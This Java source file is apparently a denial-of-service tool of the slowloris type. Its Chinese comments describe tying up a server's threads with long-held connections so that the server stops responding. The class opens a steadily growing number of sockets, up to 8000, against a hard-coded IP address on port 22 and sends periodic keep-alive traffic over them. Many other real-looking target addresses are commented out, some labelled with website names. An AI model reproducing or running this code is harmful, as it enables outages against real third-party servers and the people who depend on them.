package gongji.tomcat.linksend;import java.io.IOException;public class True_SocketClientsSendGongJi {	// 设计思路 长连接占用线程数 导致无服务	// 使用了一个线程 缺陷	// 省流量	// 设计思路 设置一个自增的空间100 每次检测是不是超了 如果是那就再加 知道最大3000	// public static String ip = "123.127.158.231";	// public static String ip = "211.144.152.109";	// public static String ip = "210.51.4.191";	// public static String ip = "118.123.253.130";//	public static String ip = "61.139.126.122";// tiqiaa.com//	 public static String ip = "118.123.18.22";//bbs.tiqiaa.com php	// public static String ip = "218.28.186.194";//www.hncc.net 这个是微软IIS	// public static String ip = "119.161.210.75";	// public static String ip = "61.155.149.92";	 public static String ip = "118.145.5.137";	// public static String ip = "115.28.177.119";//	 public static String ip = "110.249.160.114";	public static int port = 22;			// 猜测对方设置的时间 默认20s 在这个时间内如果不连续发包会被清理掉	public static int send_time_out = 2;//发送事件	public static int test_top_time_out = 3;//测试不够的时间	// 猜测对方设置的最高线程数量 默认154	public static int nowAllSocketsTarget = 0;	public static int everyAddSockets = 50;// 每次增加的数量	public static int MaxSockets = 8000;	// boolean is_add_socket_ing;	LinkerManger manger = new LinkerManger();	public static void main(String[] args) throws IOException {		True_SocketClientsSendGongJi m = new True_SocketClientsSendGongJi();		m.all_link_send();		m.add_test_top();	}	private void all_link_send() {		new Thread(new Runnable() {			@Override			public void run() {				long sleepTime = send_time_out * 1000L;				while (true) {					System.out.println("sendThread...持续有效的攻击数量:" + manger.size()							+ " send...." + ip+":"+port);					manger.send();					try {						Thread.sleep(sleepTime);					} catch (InterruptedException e1) {						// TODO Auto-generated catch block						e1.printStackTrace();					}				}			}		}).start();	}	private void add_test_top() {		new Thread(new Runnable() {			@Override			public void run() {				long sleepTime = test_top_time_out * 1000L;				while (true) {					testTopNumber();					addnewSocket();					try {						Thread.sleep(sleepTime);					} catch (InterruptedException e1) {						// TODO Auto-generated catch block						e1.printStackTrace();					}				}			}		}).start();	}	protected void testTopNumber() {		System.out.println("testTopNumber"+nowAllSocketsTarget);		if (manger.size() >= nowAllSocketsTarget) {// 达到一个坎儿			if (manger.size() >= MaxSockets) {				System.err.println("NumberThread...链接数量达到极限值" + MaxSockets + ",如需增加，请该参数重启");			} else {				System.out.println("NumberThread...数据连接目标：" + nowAllSocketsTarget + ",增加"						+ everyAddSockets);				nowAllSocketsTarget += everyAddSockets;				addnewSocket();			}		} else if (manger.size() < nowAllSocketsTarget - everyAddSockets) {						System.out.println("NumberThread...数据连接目标：" + nowAllSocketsTarget + ",减少"					+ everyAddSockets);						nowAllSocketsTarget -= everyAddSockets;		} else {			nowAllSocketsTarget += 10;		}	}	protected void addnewSocket() {		int needSocket = nowAllSocketsTarget - manger.size();				if (needSocket > 0) {			for (int i = 0; i < nowAllSocketsTarget; i++) {				new Linker(ip, port, manger);			}			testTopNumber();		}	}}